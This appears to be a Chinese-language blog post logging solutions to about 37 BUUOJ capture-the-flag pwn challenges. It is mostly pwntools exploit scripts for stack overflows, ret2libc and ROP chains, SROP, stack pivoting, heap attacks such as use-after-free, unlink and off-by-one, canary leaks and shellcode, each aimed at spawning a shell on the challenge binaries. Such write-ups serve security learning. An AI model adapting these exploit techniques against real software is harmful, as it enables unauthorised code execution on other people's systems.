---
title: BUUOJ pwn(不定期更新)
date: 2099-12-12 11:37:00
tags: pwn
top: 3
---
在buuoj平台上做题的记录，一般情况下只记录能学到新东西的题  
同类型的题只记录一次  
有一些觉得比较典型的题，单独写，在此处贴链接  
主要看心情  
<!-- more -->
## 0x01 rip覆盖一下  
```Python
from pwn import *
context.log_level = 'debug'
p=remote("node3.buuoj.cn",27714)
payload = "a"*23 + p64(0x40118A)
p.sendline(payload)
p.interactive()
``` 

## 0x02 warmup_csaw_2016  
```Python
from pwn import*
#context.log_level = 'debug'
elf=ELF("./warmup_csaw_2016")
#p=process("./warmup_csaw_2016")
p=remote("node3.buuoj.cn",26890)
p.recvuntil(">")
payload = "a"*72 + p64(0x40060D)
p.sendline(payload)
sleep(0.1)
p.interactive()
``` 

## 0x03  ciscn_2019_n_1
很典型的64位ret2libc  
```Python
# -*- coding: utf-8 -*-
from pwn import*
#context.log_level = 'debug'
p=remote("node3.buuoj.cn",29434)
p=process('./ciscn_2019_n_1')
elf=ELF('./ciscn_2019_n_1')
libc=ELF('libc-2.27.so')

pop_rdi_ret = 0x0000000000400793 

payload = "a"*0x38 + p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

p.recvuntil("number.\n")
p.sendline(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print "puts_addr:" + hex(puts_addr)
offset = puts_addr - libc.symbols['__libc_start_main']
sys_addr = offset + libc.symbols['system']
print "sys_addr:" + hex(sys_addr)
binsh_addr = libc.search('/bin/sh').next() + offset
print "binsh_addr:" + hex(binsh_addr)

payload = "a"*0x38 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)

p.recvuntil("number.\n")
p.sendline(payload)
#sleep(0.1)
p.interactive()
``` 

如果在没有libc的情况下也可以把/bin/sh字符串写入一个段内去执行system("/bin/sh")  

```Python
# -*- coding: utf-8 -*-
from pwn import*
#context.log_level = 'debug'
p=remote("node3.buuoj.cn",29434)
p=process('./ciscn_2019_n_1')
elf=ELF('./ciscn_2019_n_1')
pop_rdi_ret = 0x0000000000400793
bss_start = elf.bss()
gets = elf.plt['gets']
sys_addr = elf.plt['system']
payload = "a"*0x38 + p64(pop_rdi_ret) + p64(bss_start) + p64(gets) 
payload += p64(pop_rdi_ret) + p64(bss_start) + p64(sys_addr) 
p.sendline(payload)
p.sendline("/bin/sh\x00")
p.interactive()
```  

## 0x04  [HarekazeCTF2019]baby_rop2
差点把babyrop做成了这题，后来才发现babyrop有/bin/sh字符串……   
这题用了printf泄露__libc_start_main函数的地址，特别的地方在于布置printf的两个参数，是以前没有做过的。另外，one_gadget真香！
```python
#!/usr/bin/env python2
#conding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
p=remote("node3.buuoj.cn",25892)
#p = process("./babyrop2")
elf = ELF("./babyrop2")
libc = elf.libc
pop_rdi_ret = 0x0000000000400733
pop_rsi_r15 = 0x0000000000400731
string = 0x400770  #printf的"%s"参数

padding = "a"*0x28
payload = padding 
payload += p64(pop_rdi_ret) 
payload += p64(string) 
payload += p64(pop_rsi_r15) 
payload += p64(elf.got['__libc_start_main'])  # 用__libc_start_main的got地址作为printf的第二个参数
payload += "a"*8  # 没有单独的pop_rsi_ret，所以r15里面要放一个垃圾值
payload += p64(elf.plt['printf']) 
payload += p64(elf.symbols['main'])
#gdb.attach(p)
p.sendline(payload)

__libc_start_main_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
base = __libc_start_main_addr - libc.symbols['__libc_start_main']
log.success("__libc_start_main_addr==>" + hex(__libc_start_main_addr))
log.success("base==>" + hex(base))

one_gadget = base + 0x45216
payload1 = padding + p64(one_gadget)
p.sendline(payload1)
p.interactive()
```  
## 0x05 BWrqt--spwn
详见栈迁移学习文章  
[spwn](https://lyp0000.github.io/2020/01/17/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0/#more)  
## 0x06  bjdctf_2020_babystack2   
先看一下main函数  
![](bjdctf_2020_babystack2_1.png)
可以看到read的最后一个参数是需要我们输入长度的，但是下面对于长度有一个if条件检测，不能大于10。但是我们需要让nbytes起码要大于0x10才能溢出。所以我们需要输入"-1"，输入-1的原因是因为read的最后一个参数是unsigned int类型，0是最小值，输入-1的话他会变成最大值，这个数字很大很大，必然能造成溢出，而且-1 < 10 也能绕过if的检测，这题又学到了东西。  
贴出exp  
```python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("node3.buuoj.cn",27823)
p=process("./bjdctf_2020_babystack2")
elf=ELF("./bjdctf_2020_babystack2")
libc=elf.libc
padding = "a"*0x10 + "a"*8
p.recvuntil("name:\n")
p.sendline("-1")
p.recvuntil("name?\n")
payload = padding + p64(0x400726)
p.sendline(payload)
p.interactive()  
```  
## 0x07 hitcontraining_uaf
UAF漏洞，修改小note的puts字段之后，只要执行print_note函数，就可以执行magic函数  
```python  
#coding=utf-8
from pwn import*
from LibcSearcher import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=process("./hacknote")
#p=remote("node3.buuoj.cn",25290)
elf=ELF("./hacknote")
magic = 0x8048986

def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("size :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.sendline(content)

def delete(index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))

def view(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))

add(16,"aaa")
add(16,"bbb")

delete(0)
delete(1)

add(8,p32(magic))
view(0)

p.interactive()
```  
## 0x08 pwnable_hacknote  
```python
#coding=utf-8
from pwn import*
from LibcSearcher import*
#context.log_level = 'debug'
p=process("./hacknote")
#p=remote("node3.buuoj.cn",29406)
elf=ELF("./hacknote")
puts = 0x804862B

def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("size :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.sendline(content)

def delete(index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))

def view(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))

add(16,"aaa")
add(16,"bbb")

delete(0)
delete(1)

add(8,p32(puts)+p32(elf.got['puts']))
view(0)

puts_addr = u32(p.recvuntil("\xf7")[-4:])
libc = LibcSearcher("puts",puts_addr)
offset = puts_addr - libc.dump('puts')
system_addr = offset + libc.dump('system')
log.success("puts_addr==>" + hex(puts_addr))
log.success("system_addr==>" + hex(system_addr))

delete(2)
add(8,p32(system_addr)+";sh")
view(0)

p.interactive()  
```  
## 0x09 gyctf_2020_borrowstack  
i春秋的抗击疫情公益赛，栈迁移，不是自己做出来的，挖坑待填……武汉加油！  
据说执行完puts函数之后，read的got表被改写了，导致rip变成了0，所以需要往后挪挪位置……  
```  
因为迁移之后函数调用会让栈增高，表现出来的就是bss的低地址会被拿来放一些数据，所以read_got就被改了
```   
后面再补充，还没理解  
```python  
#coding=utf-8
from pwn import*
from LibcSearcher import*
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
p=process("./borrowstack")
#p=remote("node3.buuoj.cn",26086)
#p=remote("123.56.85.29",3635)
elf = ELF("./borrowstack")
libc = elf.libc
leave_ret = 0x400699
pop_rdi_ret = 0x400703
pop_rsi_r15 = 0x400701
ret = 0x00000000004004c9
ret = p64(ret)
buf = elf.bss() + 0x300

p.recvuntil("want\n")
p.send("a"*0x60 + p64(0x601080) + p64(leave_ret))
p.recvuntil("now!\n")
payload = p64(buf) +ret+ret+ret+ret+ret+ret+ p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) 
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15) + p64(buf) + p64(0) + p64(elf.plt['read']) 
payload += p64(leave_ret)
#gdb.attach(p)
p.send(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success("puts_addr==>" + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search("/bin/sh").next()
one_gadget = libc_base + 0xf1147 

p.send(p64(0xdeadbeef) + p64(one_gadget))

p.interactive()

```  
## 0x10  ciscn_2019_es_7/ciscn_2019_s_3  
SROP一把梭    
```python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
context.arch = 'amd64'
p=remote("node3.buuoj.cn",27476)
#p = process("./ciscn_2019_es_7")
elf = ELF("./ciscn_2019_es_7")
libc = ELF("/home/N0vice/Desktop/BUUCTF/libc-2.27.so")
syscall_addr = 0x0000000000400517
st_sigreturn = 0x00000000004004da
main_addr = elf.symbols['main']
#gdb.attach(p)
payload = "/bin/sh\x00" + "\x00"*8 + p64(0x4004EE) 
p.send(payload)
p.recv(32)
stack_addr = u64(p.recv(8))
stack_addr = stack_addr - 280
log.success('stack_addr==>' + hex(stack_addr))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = "a"*16 + p64(st_sigreturn) + p64(syscall_addr) + str(frame)
p.send(payload)
p.interactive()
```  
## 0x11  hitcon2014_stkof  
unlink，通过从chunk_mem_addr的指针指向的地方开始修改，即从0x602138开始修改，然后将三个数组分别改成free_got,puts_got,atoi_got三个got表，然后再通过修改chunk1，把free_got改写为puts_plt，然后执行free函数就会泄露puts函数地址，最后改atoi函数的got为one_gadget，只要输入选项就会执行atoi函数，即执行one_gadget  
```python  
from pwn import*
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
context.arch = 'amd64'
#p=remote("node3.buuoj.cn",25166)
p = process("./stkof")
elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bss = 0x602140 + 0x10
free_got=elf.got['free']
puts_got=elf.got['puts']
atoi_got=elf.got['atoi']
puts_plt=elf.plt['puts']
def add(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil("OK\n")
def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
def edit(idx,size,content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil("OK\n")

add(0x10)
add(0x30)
add(0x80)

payload = p64(0) + p64(0x31) + p64(bss-0x18) + p64(bss-0x10)
payload += "a"*0x10
payload += p64(0x30) + p64(0x90)

edit(2,len(payload),payload)
free(3)
p.recvuntil('OK\n')
payload = p64(0)*2 + p64(free_got) + p64(puts_got) + p64(atoi_got) 
edit(2,len(payload),payload)
gdb.attach(p)
payload = p64(puts_plt)
edit(1,len(payload),payload)
#gdb.attach(p)
free(2)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.success('puts addr: '+hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
log.success('libc_base: '+hex(libc_base))
one_gadget = libc_base + 0x4526a
payload = p64(one_gadget)
edit(3,len(payload),payload)
p.interactive()
```  
## 0x12  actf_2019_babystack  
栈迁移，溢出只能控制到eip，然后题中会泄露栈地址，我们用泄露出的栈地址吧rbp覆盖掉，然后rip指向leave_ret，栈就会迁移到上面read读进去的地方，然后在read读进去的地方执行我们的rop链
```Python  
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("node3.buuoj.cn",25727)
p=process("./ACTF_2019_babystack")
elf=ELF("./ACTF_2019_babystack")
libc=ELF("/home/N0vice/Desktop/BUUCTF/libc-2.27.so")
#libc=elf.libc
leave_ret = 0x0000000000400a18
pop_rdi_ret = 0x0000000000400ad3
p.recvuntil("?\n")
p.sendline("224")
p.recvuntil('saved at')
p.recvuntil("0x")
stack_addr = int(p.recvline(),16)
#stack_addr = int((p.recvline_contains('0x7f')),16)
log.success("stack_addr==>" + hex(stack_addr))

payload = p64(0) + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4008F6) # main_addr
payload += "a"*(0xD0 - len(payload))
payload += p64(stack_addr) + p64(leave_ret)
p.recvuntil('>')
p.send(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) # leak puts_addr
libc_base = puts_addr - libc.sym['puts']
log.success("puts_addr==>" + hex(puts_addr))

p.recvuntil("?\n")
p.sendline("224")
p.recvuntil('saved at')
p.recvuntil("0x")
stack_addr = int(p.recvline(),16)
log.success("stack_addr==>" + hex(stack_addr))

# 0x4f2c5 0x4f322 0x10a38c
one_gadget = libc_base + 0x4f2c5
payload = p64(0) + p64(one_gadget)
payload += "a"*(0xD0 - len(payload))
payload += p64(stack_addr) + p64(leave_ret)
p.recvuntil('>')
p.send(payload)

p.interactive()
```  
## 0x13 pwnable_orw  
orw一把梭  
```Python  
from pwn import*
#p=process("pwnable_orw")
p=remote("node3.buuoj.cn",28753)
orw = asm(shellcraft.open("flag", 0))
orw += asm(shellcraft.read(3, 0x804a040, 0x100))
orw += asm(shellcraft.write(1, 0x804a040, 0x100))
orw += asm(shellcraft.exit(0))

p.sendafter("shellcode:", orw)
p.interactive()
```  
## 0x14  get_started_3dsctf_2016 && not_the_same_3dsctf_2016
这两题都是一样的套路，用mprotect函数改一块可读可写的区域的权限为可读可写可执行，然后写shellcode,这里要提一下，为了使堆栈还原，所以调用mprotect函数之后要用pop保证堆栈平衡，因为push了3个参数，所以要用pop三个寄存器  
```Python  
#coding=utf-8
from pwn import*
context.log_level = 'debug'
context.terminal = ('terminator','-x','sh','-c')
#p = remote("node3.buuoj.cn",27219)
p=process("./get_started_3dsctf_2016")
elf = ELF("./get_started_3dsctf_2016")
addr = 0x80ea000
pop3ret = 0x0804f460 #pop_ebx_esi_ebp_ret 其实只要找一个pop三个寄存器的gadget就行了
payload = "a"*0x38
payload += p32(elf.sym['mprotect']) + p32(pop3ret) + p32(addr) + p32(0x2000) + p32(7)
payload += p32(elf.sym['read']) + p32(pop3ret) + p32(0) + p32(addr) + p32(0x200) + p32(addr)
sleep(0.01)
#p.recvline()
p.sendline(payload)
#gdb.attach(p)
payload = asm(shellcraft.sh())
p.send(payload)
p.interactive()
```  
   
```Python   
from pwn import*
context.log_level = 'debug'
context.terminal = ('terminator','-x','sh','-c')
p = remote("node3.buuoj.cn",26187)
#p=process("./not_the_same_3dsctf_2016")
elf = ELF("./not_the_same_3dsctf_2016")
addr = 0x80ea000
pop3ret = 0x0804f420
payload = "a"*45
payload += p32(elf.sym['mprotect']) + p32(pop3ret) + p32(addr) + p32(0x2000) + p32(7)
payload += p32(elf.sym['read']) + p32(pop3ret) + p32(0) + p32(addr) + p32(0x200) + p32(addr)
sleep(0.01)
#p.recvline()
p.sendline(payload)
#gdb.attach(p)
payload = asm(shellcraft.sh())
p.send(payload)
p.interactive()
```  
## 0x15  hitcontraining_heapcreator
off-by-one改下一个chunk的size，然后overlapping，布置free_got到chunk1中，然后show(1)泄露free_addr，接着改free_got为system。/bin/sh已经放在了第一个chunk中  
因为本题是off-by-one，只能溢出一个字节，所以必须要用\x41，不能用p64(0x41)，p64是8个字节    
```python  
#coding=utf-8
from pwn import *
context.terminal = ['terminator','-x','sh','-c']
#p = process('./heapcreator')
p=remote("node3.buuoj.cn",29112)
elf = ELF('./heapcreator')
libc = elf.libc

def create(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(content)

def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))

free_got = 0x602018
create(0x18,"aaaa")
create(0x10,"bbbb")
payload = "/bin/sh\x00" + "a"*0x10 + '\x41'  # 不能用p64(0x41)
edit(0,payload)
delete(1)
payload = p64(0)*3 +p64(0x21)+p64(0x30)+ p64(free_got)
create(0x30,payload)
show(1)

free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
#free_addr = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
libc_base = free_addr - libc.sym['free']
system_addr = libc_base + libc.sym['system']
log.success("free_addr==>" + hex(free_addr))
log.success("system_addr==>" + hex(system_addr))
payload = p64(system_addr)
edit(1,payload)
delete(0)
#gdb.attach(p)
p.interactive()
```  
## 0x16  cmcc_pwnme1  
这题未知原因要用LibcSearcher才能打通，加上用了新的模板，故做个记录  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './pwnme1' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",28788)
elf=ELF(binary)
libc=ELF("libc6-i386_2.23-0ubuntu10_amd64.so")
def exp():
    payload = "a"*168
    payload += p32(elf.plt['puts']) 
    payload += p32(elf.sym['main'])
    payload += p32(elf.got['puts'])
    p.recvuntil(">> 6. Exit    \n")
    p.sendline("5")
    p.recvuntil("fruit:")
    p.sendline(payload)
    puts_addr = u32(p.recvuntil("\xf7")[-4:])
    libc_base = puts_addr - libc.sym['puts']
    log.success("puts_addr==>" + hex(puts_addr))
    log.success("libc_base==>" + hex(libc_base))
    sys_addr = libc_base + libc.sym['system']
    binsh = libc_base + libc.search("/bin/sh").next()
    p.recvuntil(">> 6. Exit    \n")
    p.sendline("5")
    p.recvuntil("fruit:")
    one_gadget = libc_base + 0xf02a4
    payload = "a"*168
    payload += p32(sys_addr)
    payload += p32(0xdeadbeef)
    payload += p32(binsh)
    p.send(payload)
    p.interactive()
exp()
```  
## 0x17  0ctf2017-babyheap  
https://n0vice.top/2020/04/16/0ctf2017-babyheap  
## 0x18  wdb2018_guess  
https://n0vice.top/2020/04/09/Stack-smash  
## 0x19  hitcontraining_magicheap  
满足choice为4869，并且magic的值大于4869，即可getshell  
我们利用unsorted bin attack，将magic的值改掉即可    
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './magicheap' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",25408)
elf=ELF(binary)
libc=elf.libc
magic = 0x6020A0
def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("Heap : ")
    p.sendline(str(size))
    p.recvuntil("heap:")
    p.send(content)
def edit(index,size,content):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))
    p.recvuntil("Heap : ")
    p.sendline(str(size))
    p.recvuntil("heap : ")
    p.send(content)
def free(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))
def exp():
    add(0x90,"aaa") # 0
    add(0x90,"bbb") # 1
    add(0x10,"ccc")
    free(1)
    payload = "a"*0x90 + p64(0) + p64(0xa1) + p64(0) + p64(magic-16)
    edit(0,0xb0,payload)
    add(0x90,"fuck")
    p.recvuntil(":")
    p.sendline("4869")
    p.interactive()
exp()
```  
## 0x20 roarctf_2019_easy_pwn  
https://n0vice.top/2020/04/19/roarctf-2019-easypwn  
## 0x21 gyctf_2020_document  
这题思路如下  
申请document0、document1，free document0，UAF，通过unsorted bin泄露libc_base  
申请document2，会切割free掉的document0一部分作为存储document2的ptr的部分，剩下的放入small bin  
free 1，进入unsorted bin，然后再次申请document3，此时剩下在small bin中的部分会变成document3的存储ptr的那部分，并且document3和document1用的是同一块内存  
然后大概会长这样  
```shell  
pwndbg> x/70gx 0x5587eb907000
0x5587eb907000:	0x0000000000000000	0x0000000000000021
0x5587eb907010:	0x00005587eb907030	0x0000000000000001
0x5587eb907020:	0x0000000000000000	0x0000000000000021
0x5587eb907030:	0x00005587eb907170	0x0000000000000001
0x5587eb907040:	0x6362626262626262	0x0000000000000021
0x5587eb907050:	0x00005587eb9070e0 <==document3 ptr	0x0000000000000001
0x5587eb907060:	0x6363636363636363	0x0000000000000051
0x5587eb907070:	0x00007f1698eabb78	0x00007f1698eabb78
0x5587eb907080:	0x6363636363636363	0x6363636363636363
0x5587eb907090:	0x6363636363636363	0x6363636363636363
0x5587eb9070a0:	0x6363636363636363	0x6363636363636363
0x5587eb9070b0:	0x0000000000000050	0x0000000000000020
0x5587eb9070c0:	0x00005587eb9070e0	0x0000000000000001
0x5587eb9070d0:	0x0000000000000000	0x0000000000000091
0x5587eb9070e0:	0x0068732f6e69622f	0x0000000000000010
0x5587eb9070f0:	0x630068732f6e6962	0x6363636363636363
0x5587eb907100:	0x6363636363636363	0x6363636363636363
0x5587eb907110:	0x6363636363636363	0x6363636363636363
0x5587eb907120:	0x6363636363636363	0x6363636363636363
0x5587eb907130:	0x6363636363636363	0x6363636363636363
0x5587eb907140:	0x6363636363636363	0x6363636363636363
0x5587eb907150:	0x6363636363636363	0x6363636363636363
0x5587eb907160:	0x0000000000000090	0x0000000000000091
0x5587eb907170:	0x0068732f6e69622f	0x0000000000000010
0x5587eb907180:	0x630068732f6e6962	0x6363636363636363
0x5587eb907190:	0x6363636363636363	0x6363636363636363
0x5587eb9071a0:	0x6363636363636363	0x6363636363636363
0x5587eb9071b0:	0x6363636363636363	0x6363636363636363
0x5587eb9071c0:	0x6363636363636363	0x6363636363636363
0x5587eb9071d0:	0x6363636363636363	0x6363636363636363
0x5587eb9071e0:	0x6363636363636363	0x6363636363636363
0x5587eb9071f0:	0x0000000000000000	0x0000000000020e11
```  
然后我们把这个地方改成free_hook-0x10  
那么chunk3的地址就会变成free_hook-0x10，然后再edit document3，就能把free_hook改成system了  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './gyctf_2020_document' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",28029)
elf=ELF(binary)
libc=elf.libc
def add(name,sex,content):
    p.recvuntil("choice : \n")
    p.sendline("1")
    p.recvuntil("name\n")
    p.send(str(name))
    p.recvuntil("sex\n")
    p.send(str(sex))
    p.recvuntil("information\n")
    p.sendline(str(content))
def free(index):
    p.recvuntil("choice : \n")
    p.sendline("4")
    p.recvuntil("index : \n")
    p.sendline(str(index))
def edit(index,sex,content):
    p.recvuntil("choice : \n")
    p.sendline("3")
    p.recvuntil("index : \n")
    p.sendline(str(index))
    p.recvuntil("sex?\n")
    p.sendline(str(sex))
    p.recvuntil("information\n")
    p.send(str(content))
def show(index):
    p.recvuntil("choice : \n")
    p.sendline("2")
    p.recvuntil("index : \n")
    p.sendline(str(index))
def exp():
    add("aaaaaaaa","bbbbbbbb","c"*112) # 0
    add("aaaaaaaa","bbbbbbbb","c"*112) # 1
    free(0)
    show(0)
    libc_base = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - 0x3c4b78
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    log.success("libc_base==>" + hex(libc_base))
    log.success("malloc_hook==>" + hex(malloc_hook))
    log.success("free_hook==>" + hex(free_hook))

    add("/bin/sh\x00","/bin/sh\x00","c"*112) # 2
    free(1)
    add("/bin/sh\x00","/bin/sh\x00","c"*112) # 3
    gdb.attach(p)
    payload = p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(0x1) + p64(0) + p64(0x51)
    payload += "\x00"*(112-len(payload))
    edit(0,"N",payload)
    payload = p64(system)
    payload += "\x00"*(112-len(payload))
    edit(3,"N",payload)
    free(1)
    
    p.interactive()
exp()
```  
## 0x22  others_babystack  
覆盖canary的低位\x00，将字符串和canary连起来，泄露出canary，然后ROP  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './babystack' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",26702)
elf=ELF(binary)
libc=elf.libc
pop_rdi_ret = 0x0000000000400a93    
def exp():
    p.recvuntil(">> ")
    p.sendline("1")
    payload = "a"*133 + "bbbb"
    p.send(payload)
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("bbbb")
    canary = p.recv(7).rjust(8,"\x00")
    canary = u64(canary)
    log.success("canary==>" + hex(canary))
    p.recvuntil(">> ")
    p.sendline("1")
    payload = "a"*0x88 + p64(canary) + "a"*8 + p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(0x400908)
    p.send(payload)
    p.recvuntil(">> ")
    p.sendline("3")
    libc_start_main_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    #libc_start_main_addr = u32(p.recvuntil('\xf7')[-4:])
    libc_base = libc_start_main_addr - libc.sym['__libc_start_main']
    log.success("libc_start_main_addr==>" + hex(libc_start_main_addr))
    log.success("libc_base==>" + hex(libc_base))
    system = libc_base + libc.sym['system']
    binsh = libc_base + libc.search("/bin/sh").next()
    one_gadget = libc_base + 0x45216
    payload = "a"*0x88 + p64(canary) + "a"*8 + p64(pop_rdi_ret)  + p64(binsh) + p64(system)
    p.recvuntil(">> ")
    p.sendline("1")
    p.send(payload)
    p.recvuntil(">> ")
    p.sendline("3")
    p.interactive()
exp()
```  
## 0x23 gyctf_2020_some_thing_exceting  
这题将flag读到了程序中，所以只需要leak出flag就行了  
但是我想fastbin attack打一下getshell看看，但是出了点问题  
fastbin构造成chunk0->chunk1->chunk0这样的时候，泄露不出地址了，接收不到0x7f开头的地址样子的东西了  
不知道为什么  
后面再补（挖坑待填）  
exp:  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './gyctf_2020_some_thing_exceting' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",29130)
elf=ELF(binary)
libc=elf.libc
flag = 0x6020a8
def add(size_ba,size_na,content_a,content_b):
    p.recvuntil("do :")
    p.sendline("1")
    p.recvuntil("length : ")
    p.sendline(str(size_ba))
    p.recvuntil("ba : ")
    p.send(content_a)
    p.recvuntil("length : ")
    p.sendline(str(size_na))
    p.recvuntil("na : ")
    p.send(content_b)
def free(index):
    p.recvuntil("do :")
    p.sendline("3")
    p.recvuntil("ID : ")
    p.sendline(str(index))
def show(index):
    p.recvuntil("do :")
    p.sendline("4")
    p.recvuntil("ID : ")
    p.sendline(str(index))
def exp():
    add(0x60,0x60,"aaaa","bbbb") # 0
    add(0x60,0x60,"cccc","dddd") # 1
    free(0)
    free(1)
    add(16,0x60,p64(flag),p64(flag))
    show(0)
    p.interactive()
exp()
```  
## 0x24  npuctf_2020_easyheap  
申请释放0x20的chunk后，再申请回来，就能获得用户内容相邻的两块chunk，保存用户chunk信息的chunk会在上面放在一起  
然后off by one，形成chunk overlap，伪造存信息的chunk，就能把指针改成free_got，同时伪造的时候把prev_inuse位改成0  
构造成一个假的被free的chunk，就能leak libc，然后向被改之前的指针对应的chunk写入system  
就getshell了  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './npuctf_2020_easyheap' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",28734)
elf=ELF(binary)
libc=elf.libc
def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("only) : ")
    p.sendline(str(size))
    p.recvuntil("Content:")
    p.send(content)
def edit(index,content):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))
    p.recvuntil("Content: ")
    p.send(content)
def show(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))
def free(index):
    p.recvuntil("choice :")
    p.sendline("4")
    p.recvuntil("Index :")
    p.sendline(str(index))
def exp():
    add(24,"aaaa") # 0
    free(0)
    add(56,"bbbb") # 0
    add(24,"cccc") # 1
    add(24,"2222") # 2
    add(24,"3333") # 3
    payload = "a"*0x38 + p8(0x41)
    edit(0,payload)
    free(1)
    add(56,"fuck") # 1
    payload = "a"*0x10 + p64(0) + p64(0x20) + p64(0x18) + p64(elf.got['free'])
    edit(1,payload)
    show(2)
    free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    log.success("free_addr==>" + hex(free_addr))
    libc_base = free_addr - libc.sym['free']
    log.success("libc_base==>" + hex(libc_base))
    system = libc_base + libc.sym['system']
    edit(2,p64(system))
    add(24,"/bin/sh") # 4
    free(4)
    p.interactive()
exp()
```  
## 0x25 wdb_2018_3rd_pesp  
这个题比较简单，edit存在任意字节溢出，模仿ZJCTF那个题做，改chunk0的指针为free_got，然后改free_got为system，但是有一个需要注意的，edit还存在off by null，会把后面一个地址的低字节置0，而free_got下面就是put_got，这一波直接把puts_got改炸了，程序就挂了，所以要把puts_got复原  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './wdb_2018_3rd_pesp' 
local = 0
if local == 1:
    p=process(binary)
else:
